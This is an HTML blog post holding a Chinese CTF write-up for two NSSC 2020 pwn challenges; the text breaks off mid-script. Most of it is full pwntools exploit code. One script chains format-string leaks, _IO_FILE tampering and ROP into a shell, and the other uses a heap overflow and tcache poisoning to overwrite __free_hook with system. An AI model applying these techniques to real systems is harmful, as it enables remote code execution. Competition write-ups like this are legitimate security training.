<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NSSC 2020 CTF | Hexo</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/demo/"><span class="navItemTitle">独立页面</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>NSSC 2020 CTF</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2020-11-06T13:46:12.000Z" id="date"> 2020-11-06</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-04-30T14:12:04.400Z" id="updated"> 2022-04-30</time></div></span><br><span>Word Count: <div class="control">2.8k</div></span><br><span>Read Time: <div class="control">16 min</div></span></div></div><hr><div id="post-content"><h1 id="NSSC-2020-CTF-WP-2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）"><a href="#NSSC-2020-CTF-WP-2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）" class="headerlink" title="NSSC 2020 CTF WP [2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）]"></a>NSSC 2020 CTF WP [2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）]</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="Trials-competition"><a href="#Trials-competition" class="headerlink" title="Trials competition"></a>Trials competition</h1><p>这次比赛表现得不是很好，题目不是很难，也怪自己没把握住时间，第三道比赛刚结束就打通了。。。这次名次为10，应该进线下了，下次好好加油！</p>
<p>本次比赛排名如下:</p>
<p><img src="/images/wp-nssc-2020-01.png" alt="img"></p>
<h2 id="pwn1-Echo"><a href="#pwn1-Echo" class="headerlink" title="pwn1[Echo]"></a>pwn1[Echo]</h2><p>通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &amp;main ret构造rop链</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li  = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;Echo&#x27;</span><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.23&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;121.36.216.253&quot;</span><br>server_port = <span class="hljs-number">10001</span><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	<span class="hljs-comment">#leak elf</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>)<br>	sl(<span class="hljs-string">&#x27;%20$p&#x27;</span>)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	elf_base = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - (<span class="hljs-number">0x562a00b85150</span>-  <span class="hljs-number">0x562a00b84000</span>  )<br>	li(<span class="hljs-string">&#x27;elf_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(elf_base))<br>	pop_rdi = elf_base + <span class="hljs-number">0x11b3</span><br>	<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>)<br>	sl(<span class="hljs-string">&#x27;%21$p&#x27;</span>)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	libc_base = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>] - <span class="hljs-number">240</span><br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	sh_addr  = libc_base + <span class="hljs-number">0x18ce17</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>)<br>	sl(<span class="hljs-string">&#x27;%23$p&#x27;</span>)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	stack_ret = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0xe0</span><br>	li(<span class="hljs-string">&#x27;stack_ret: &#x27;</span> + <span class="hljs-built_in">hex</span>(stack_ret))<br>	_IO_2_1_stdin_ = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>	_IO_buf_base = _IO_2_1_stdin_ + <span class="hljs-number">0x8</span> * <span class="hljs-number">7</span><br>	li(<span class="hljs-string">&#x27;_IO_buf_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_buf_base))<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	p = p64(_IO_buf_base)<br>	sl(p)<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))<br>	<span class="hljs-comment">#sl(&#x27;%16$p&#x27;)</span><br>	s(<span class="hljs-string">&#x27;%16$hhn&#x27;</span>)<br>	p = p64(_IO_2_1_stdin_ + <span class="hljs-number">0x83</span>) * <span class="hljs-number">3</span><br>	p += p64(stack_ret) + p64(stack_ret + <span class="hljs-number">0x8</span> * <span class="hljs-number">3</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, p) <span class="hljs-comment">#length:</span><br>	sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(p) - <span class="hljs-number">1</span>):<br>		sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>		sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>)<br>		sl(<span class="hljs-string">&#x27; &#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	p = p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, p) <span class="hljs-comment">#length:</span><br>	sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>	<span class="hljs-comment">#db()</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env= &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br></code></pre></td></tr></table></figure>

<p>flag{0HOk4cUYpmi6tVAjQSR5zdZRHPSnpeeW}</p>
<h2 id="pwn2-noteplus"><a href="#pwn2-noteplus" class="headerlink" title="pwn2 [noteplus]"></a>pwn2 [noteplus]</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">0xF</span> )<br> &#123;<br>   <span class="hljs-keyword">if</span> ( p_addr[v6] )<br>   &#123;<br>     <span class="hljs-built_in">std</span>::__ostream_insert&lt;<span class="hljs-type">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">&quot;Content: &quot;</span>, <span class="hljs-number">9LL</span>);<br>     addr = p_addr[v0];<br>     size = p_size[v0];<br>     <span class="hljs-keyword">if</span> ( size != <span class="hljs-number">8</span> )<br>     &#123;<br>       buf = (_BYTE *)(addr + <span class="hljs-number">8</span>);<br>       v4 = (_BYTE *)(size + addr);<br>       <span class="hljs-keyword">do</span><br>       &#123;<br>         read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1uLL</span>);<br>         <span class="hljs-keyword">if</span> ( *buf == <span class="hljs-number">10</span> )<br>           <span class="hljs-keyword">break</span>;<br>         ++buf; <span class="hljs-comment">//vul</span><br>       &#125;<br>       <span class="hljs-keyword">while</span> ( v4 != buf );<br>     &#125;<br>   &#125;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>若开辟大小为0, 则可造成堆溢出, 修改tcahe bin fd，实现任意地址开辟，修改free_hook为system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li  = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.27&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;121.36.245.213&quot;</span><br>server_port = <span class="hljs-number">23333</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">i, size</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">i, d</span>):<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	ad(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>	ad(<span class="hljs-number">1</span>, <span class="hljs-number">0x100</span>)<br>	ad(<span class="hljs-number">2</span>, <span class="hljs-number">0xf0</span>)<br>	ad(<span class="hljs-number">3</span>, <span class="hljs-number">0xf0</span>)<br>	ad(<span class="hljs-number">4</span>, <span class="hljs-number">0xf0</span>)<br>	ad(<span class="hljs-number">5</span>, <span class="hljs-number">0xf0</span>)<br>	ad(<span class="hljs-number">6</span>, <span class="hljs-number">0x100</span>)<br>	ad(<span class="hljs-number">7</span>, <span class="hljs-number">0x60</span>)<br>	p = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0x511</span>)<br>	md(<span class="hljs-number">0x0</span>, p)<br>	rm(<span class="hljs-number">1</span>)<br>	ad(<span class="hljs-number">1</span>, <span class="hljs-number">0x80</span>)<br>	dp(<span class="hljs-number">1</span>)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	main_arena = <span class="hljs-number">0x3afc40</span> <span class="hljs-comment">#local</span><br>	main_arena = <span class="hljs-number">0x3ebc40</span><br>	libc_base = leak - main_arena - <span class="hljs-number">0x430</span> - <span class="hljs-number">96</span><br>	free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	rm(<span class="hljs-number">1</span>)<br>	p = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0x91</span>)<br>	p += p64(free_hook - <span class="hljs-number">8</span>)<br>	md(<span class="hljs-number">0x0</span>, p)<br>	ad(<span class="hljs-number">1</span>, <span class="hljs-number">0x80</span>)<br>	md(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">28</span>)<br>	ad(<span class="hljs-number">8</span>, <span class="hljs-number">0x80</span>) <span class="hljs-comment"># malloc to free_hook</span><br>	md(<span class="hljs-number">8</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>	p = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0x91</span>)<br>	p += <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>	md(<span class="hljs-number">0</span>, p)<br>	db()<br>	rm(<span class="hljs-number">1</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span 